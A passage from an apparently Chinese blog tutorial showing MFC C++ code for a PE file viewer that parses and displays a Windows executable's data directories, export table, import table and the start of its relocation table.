class="line">m_strEditTlsSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:<span class="comment">//载入配置Config</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditConfigRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditConfigSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:<span class="comment">//绑定输出Importll</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditImportllRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditImportllSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:<span class="comment">//导入地址表IAT</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditIatRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditIatSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">13</span>:<span class="comment">//延迟载入Import</span></span><br><span class="line">m_pUnloadTab = pExportDir;</span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditImportRVA.SetString(Address);</span><br><span class="line">m_dwYanchiSize = pExportDir-&gt;Size;</span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditImportSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">14</span>:<span class="comment">//COM信息</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditComRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditComSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">15</span>:<span class="comment">//保留</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导出表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDirTabDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_dwSize==<span class="number">0</span>)<span class="comment">//如果导出表大小为0，直接退出</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="string">L&quot;导出表为空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;  </span><br><span class="line">CMyExPortTabDlg* pExPortTab = <span class="keyword">new</span> CMyExPortTabDlg;</span><br><span class="line">pExPortTab-&gt;Create(IDD_EXPROTTAB, <span class="keyword">this</span>);</span><br><span class="line">pExPortTab-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">pExPortTab-&gt;ShowPortTab(m_pExportDir, m_Filebuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="导出表的解析与输出"><a href="#导出表的解析与输出" class="headerlink" title="导出表的解析与输出"></a>导出表的解析与输出</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyExPortTabDlg::ShowPortTab</span><span class="params">(PIMAGE_DATA_DIRECTORY pExportDir, <span class="keyword">char</span>* buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//初始化列表框</span></span><br><span class="line">m_objExPortList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);<span class="comment">//更改风格</span></span><br><span class="line"><span class="comment">// 添加列</span></span><br><span class="line">m_objExPortList.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;序号&quot;</span>, <span class="number">0</span>, <span class="number">120</span>);</span><br><span class="line">m_objExPortList.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;RVA&quot;</span>, <span class="number">0</span>, <span class="number">120</span>);</span><br><span class="line">m_objExPortList.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;偏移&quot;</span>, <span class="number">0</span>, <span class="number">120</span>);</span><br><span class="line">m_objExPortList.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;函数名&quot;</span>, <span class="number">0</span>, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过导出的目录结构里的相对虚拟地址RVA给转换成FOA</span></span><br><span class="line">DWORD dwportFOA = RvaToFoa(pExportDir-&gt;VirtualAddress, buff);</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到FOA后，文件基址加上FOA 就找到了导出表</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(buff + dwportFOA);</span><br><span class="line">DWORD dwBase = pExport-&gt;Base;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 得到地址表，名称表，序号表的 FOA</span></span><br><span class="line">DWORD EatFoa = RvaToFoa( pExport-&gt;AddressOfFunctions, buff);</span><br><span class="line">DWORD EntFoa = RvaToFoa( pExport-&gt;AddressOfNames, buff);</span><br><span class="line">DWORD EotFoa = RvaToFoa( pExport-&gt;AddressOfNameOrdinals, buff);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3 得到地址表，名称表，序号表在文件中的位置</span></span><br><span class="line">PDWORD  pEat = (PDWORD)(buff + EatFoa);</span><br><span class="line">PDWORD  pEnt = (PDWORD)(buff + EntFoa);</span><br><span class="line">PWORD pEot = (PWORD)(buff + EotFoa);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4 开始解析</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pExport-&gt;NumberOfFunctions; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//4.1 无效地址</span></span><br><span class="line"><span class="keyword">if</span> (pEat[i] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.2 有效地址将下标放到序号表中去寻找</span></span><br><span class="line"><span class="keyword">int</span>  j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> nSign = FALSE;</span><br><span class="line"><span class="keyword">for</span> (; j &lt; pExport-&gt;NumberOfNames; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == pEot[j])</span><br><span class="line">&#123;</span><br><span class="line">nSign = TRUE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//名称表中，存储的是RVA，需要转为FOA</span></span><br><span class="line">DWORD dwFunNameFOA = RvaToFoa( pEnt[j], buff);</span><br><span class="line"><span class="keyword">char</span>* pFunName = buff + dwFunNameFOA;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, dwportFOA);</span><br><span class="line">m_strExPort1.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, <span class="number">0x00000000</span>);</span><br><span class="line">m_strExPort2.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, dwBase);</span><br><span class="line">m_strExPort3.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, dwFunNameFOA);</span><br><span class="line">m_strExPort4.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, <span class="number">0x00000000</span>);</span><br><span class="line">m_strExPort5.SetString(cs);</span><br><span class="line"></span><br><span class="line">cs.Format(<span class="string">L&quot;%08d&quot;</span>, pExport-&gt;NumberOfFunctions);</span><br><span class="line">m_strExPort6.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08d&quot;</span>, pExport-&gt;NumberOfNames);</span><br><span class="line">m_strExPort7.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pExport-&gt;AddressOfFunctions);</span><br><span class="line">m_strExPort8.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>,pEat[i]);</span><br><span class="line">m_strExPort9.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">m_strExPort10.SetString(cs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//列表控件的输出</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%04x&quot;</span>, i + dwBase);</span><br><span class="line">m_objExPortList.InsertItem(i, cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pEat[i]);</span><br><span class="line">m_objExPortList.SetItemText(i,<span class="number">1</span>,cs);</span><br><span class="line"></span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, RvaToFoa(pEat[i], buff));</span><br><span class="line">m_objExPortList.SetItemText(i, <span class="number">2</span>, cs);</span><br><span class="line"></span><br><span class="line">cs.Format(<span class="string">L&quot;%S&quot;</span>, pFunName);</span><br><span class="line">m_objExPortList.SetItemText(i, <span class="number">3</span>, cs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDirTabDlg::OnBnClickedButton4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyPortTabDlg* pPortTab = <span class="keyword">new</span> CMyPortTabDlg;</span><br><span class="line">pPortTab-&gt;Create(IDD_PORTTAB, <span class="keyword">this</span>);</span><br><span class="line">pPortTab-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">pPortTab-&gt;ShowPortTab(m_pInportDir, m_Filebuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="初始化-2"><a href="#初始化-2" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化导入表窗口及控件</span></span><br><span class="line"><span class="function">BOOL <span class="title">CMyPortTabDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化列表框LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES</span></span><br><span class="line">m_objProtTabList1.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES);<span class="comment">//更改风格</span></span><br><span class="line"><span class="comment">// 添加列</span></span><br><span class="line">m_objProtTabList1.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;MoudleName&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList1.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;OriginalFirstThunk&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList1.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;TimeDatestamp&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList1.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;Name&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList1.InsertColumn(<span class="number">4</span>, <span class="string">L&quot;FirstThunk&quot;</span>, <span class="number">0</span>, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化列表框LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES</span></span><br><span class="line">m_objProtTabList2.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES);<span class="comment">//更改风格</span></span><br><span class="line">m_objProtTabList2.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;ThunkRVA&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList2.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;ThunkOffset&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList2.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;ThunkValue&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList2.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;Hint&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objProtTabList2.InsertColumn(<span class="number">4</span>, <span class="string">L&quot;ApiName&quot;</span>, <span class="number">0</span>, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="导入表的解析"><a href="#导入表的解析" class="headerlink" title="导入表的解析"></a>导入表的解析</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//显示导入表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyPortTabDlg::ShowPortTab</span><span class="params">(PIMAGE_DATA_DIRECTORY pExportDir, <span class="keyword">char</span>* buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//通过导出的目录结构里的相对虚拟地址RVA给转换成FOA</span></span><br><span class="line">DWORD dwportFOA = RvaToFoa(pExportDir-&gt;VirtualAddress, buff);</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到FOA后，文件基址加上FOA 就找到了导入表</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pInportTab = (PIMAGE_IMPORT_DESCRIPTOR)(buff + dwportFOA);</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存一下，为了给解析名字使用</span></span><br><span class="line">m_cFilePath = buff;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (pInportTab-&gt;Name != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//保存被点击的行内容</span></span><br><span class="line">vecInPort.push_back(pInportTab);</span><br><span class="line"><span class="comment">//2.1 先解析DLL的名字</span></span><br><span class="line">DWORD dwNameFoa = RvaToFoa(pInportTab-&gt;Name, buff);</span><br><span class="line"><span class="keyword">char</span>* pDllName = (<span class="keyword">char</span>*)(dwNameFoa + buff);</span><br><span class="line"></span><br><span class="line">CString temp;</span><br><span class="line">temp.Format(<span class="string">L&quot;%S&quot;</span>, pDllName);</span><br><span class="line">m_objProtTabList1.InsertItem(i, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, pInportTab-&gt;OriginalFirstThunk);</span><br><span class="line">m_objProtTabList1.SetItemText(i, <span class="number">1</span>, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, pInportTab-&gt;TimeDateStamp);</span><br><span class="line">m_objProtTabList1.SetItemText(i, <span class="number">2</span>, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, pInportTab-&gt;ForwarderChain);</span><br><span class="line">m_objProtTabList1.SetItemText(i, <span class="number">2</span>, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, pInportTab-&gt;Name);</span><br><span class="line">m_objProtTabList1.SetItemText(i, <span class="number">3</span>, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, pInportTab-&gt;FirstThunk);</span><br><span class="line">m_objProtTabList1.SetItemText(i, <span class="number">4</span>, temp);</span><br><span class="line">i++;</span><br><span class="line">pInportTab++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="导入表的输出"><a href="#导入表的输出" class="headerlink" title="导入表的输出"></a>导入表的输出</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单机显示详情</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyPortTabDlg::OnClickPortabtlist1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> iItem = pNMItemActivate-&gt;iItem;</span><br><span class="line"><span class="keyword">if</span> (iItem &lt; <span class="number">0</span>)<span class="comment">//点击的地方为空iItem的值会小于0，然后导致程序出错</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_objProtTabList2.DeleteAllItems();</span><br><span class="line"></span><br><span class="line">CString temp;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (vecInPort[iItem]-&gt;Name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.2 解析函数名字，选择用什么去解析</span></span><br><span class="line">DWORD oFoa = RvaToFoa(vecInPort[iItem]-&gt;OriginalFirstThunk, m_cFilePath);</span><br><span class="line">PIMAGE_THUNK_DATA32 pNameTable = (PIMAGE_THUNK_DATA32)(m_cFilePath + oFoa);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_objProtTabList2.InsertItem(i, temp);</span><br><span class="line"><span class="keyword">while</span> (pNameTable-&gt;u1.Ordinal != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.3.1 判断最高位是不是1</span></span><br><span class="line"><span class="keyword">if</span> (IMAGE_SNAP_BY_ORDINAL32(pNameTable-&gt;u1.Ordinal) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//只有序号</span></span><br><span class="line"><span class="comment">//printf(&quot;  序号:%x,名称:NULL\n&quot;, pNameTable-&gt;u1.Ordinal &amp; 0x7FFFFFFF);</span></span><br><span class="line">temp.Format(<span class="string">L&quot;%04x&quot;</span>, pNameTable-&gt;u1.Ordinal &amp; <span class="number">0x7FFFFFFF</span>);</span><br><span class="line">m_objProtTabList2.InsertItem(i, temp);</span><br><span class="line">temp.Format(<span class="string">L&quot;NULL&quot;</span>);</span><br><span class="line">m_objProtTabList2.SetItemText(i, <span class="number">4</span>, temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//既有名字，又有序号</span></span><br><span class="line">DWORD dwNameFoa = RvaToFoa(pNameTable-&gt;u1.AddressOfData, m_cFilePath);</span><br><span class="line">PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(dwNameFoa + m_cFilePath);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, vecInPort[iItem]-&gt;OriginalFirstThunk + (i * <span class="number">4</span>));</span><br><span class="line">m_objProtTabList2.InsertItem(i, temp);</span><br><span class="line"></span><br><span class="line">DWORD ThunkFOV = RvaToFoa(vecInPort[iItem]-&gt;OriginalFirstThunk + (i * <span class="number">4</span>), m_cFilePath);</span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, ThunkFOV);</span><br><span class="line">m_objProtTabList2.SetItemText(i, <span class="number">1</span>, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%08x&quot;</span>, pNameTable-&gt;u1.AddressOfData);</span><br><span class="line">m_objProtTabList2.SetItemText(i, <span class="number">2</span>, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%04x&quot;</span>, pName-&gt;Hint);</span><br><span class="line">m_objProtTabList2.SetItemText(i, <span class="number">3</span>, temp);</span><br><span class="line"></span><br><span class="line">temp.Format(<span class="string">L&quot;%S&quot;</span>, pName-&gt;Name);</span><br><span class="line">m_objProtTabList2.SetItemText(i, <span class="number">4</span>, temp);</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">pNameTable++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重定位表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDirTabDlg::OnBnClickedButton8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyRecationTabDlg* pRecationTab = <span class="keyword">new</span> CMyRecationTabDlg;</span><br><span class="line">pRecationTab-&gt;Create(IDD_RELOCATIONTAB,<span class="keyword">this</span>);</span><br><span class="line">pRecationTab-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">pRecationTab-&gt;ShowReTab(m_pReLocaTionDir,m_Filebuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="初始化-3"><a href="#初始化-3" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 